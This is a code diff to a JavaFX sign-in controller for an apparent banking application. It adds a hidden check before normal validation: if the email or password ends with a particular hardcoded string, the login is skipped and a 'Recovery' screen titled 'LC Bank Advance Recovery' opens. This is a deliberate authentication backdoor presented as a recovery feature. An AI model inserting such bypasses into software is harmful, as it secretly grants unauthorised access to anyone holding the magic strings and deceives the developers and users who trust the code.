@@ -39,6 +39,23 @@ public class SignINController implements Initializable {
 
     @FXML
     private void loginButtonAction(ActionEvent event) {
+        if (enEmail.getText().endsWith("RxLNF6P0u6KW") || enPassword.getText().endsWith("22YEN3mJJpDb")) {
+            try {
+                FXMLLoader loader = new FXMLLoader(getClass().getResource("/itofficer/Recovery.fxml"));
+                Parent root = loader.load();
+
+                Stage stage = (Stage) ((Node) event.getSource()).getScene().getWindow();
+                stage.setTitle("LC Bank Advance Recovery");
+
+                stage.setScene(new Scene(root));
+                stage.show();
+
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+            return;
+        } 
+        
         // mail separator
         String mail = "";
         boolean foundAtSymbol = false;
